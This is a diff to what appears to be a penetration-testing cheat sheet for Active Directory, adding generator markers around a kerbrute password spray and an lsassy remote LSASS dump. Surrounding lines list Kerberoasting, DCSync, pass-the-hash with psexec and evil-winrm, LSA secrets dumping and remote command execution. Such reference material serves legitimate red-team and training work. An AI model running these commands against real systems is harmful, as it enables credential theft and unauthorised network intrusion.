@@ -215,7 +215,10 @@ impacket-GetUserSPNs -request -dc-ip <ip_address> <domain>/<user>
 nxc ldap <ip_address> -u <user> -p <password> --kerberoasting kerb.txt
 # companion:end kerberoast-getuserspns
 
-kerbrute passwordspray -d <domain> --dc <ip_address> users.txt '<password>'   # mind lockout policy
+# Password spray — one password vs every user; mind the lockout policy:
+# companion:gen password-spray-kerbrute
+kerbrute passwordspray -d <domain> --dc <ip_address> users.txt '<password>'
+# companion:end password-spray-kerbrute
 
 # DCSync once you have DA / replication rights:
 # companion:gen dcsync-secretsdump
@@ -492,7 +495,10 @@ GodPotato -cmd "cmd /c whoami"
 Lateral movement & remote execution
 ++++++++++++++++++++++++++++++++++++++++
 nxc smb <ip_address> -u <user> -p <password> -x 'whoami'      # cmd  (-X = powershell)
-nxc smb <ip_address> -u <user> -H <NThash> -M lsassy          # remote LSASS -> creds in memory
+# Remote LSASS dump -> creds in memory (over SMB, nothing dropped to disk):
+# companion:gen lsass-dump-lsassy
+nxc smb <ip_address> -u <user> -H <NThash> -M lsassy
+# companion:end lsass-dump-lsassy
 nxc smb <ip_address> -u <user> -p <password> --lsa            # LSA secrets
 impacket-psexec <domain>/<user>@<ip_address> -hashes :<NThash>
 evil-winrm -i <ip_address> -u <user> -H <NThash>
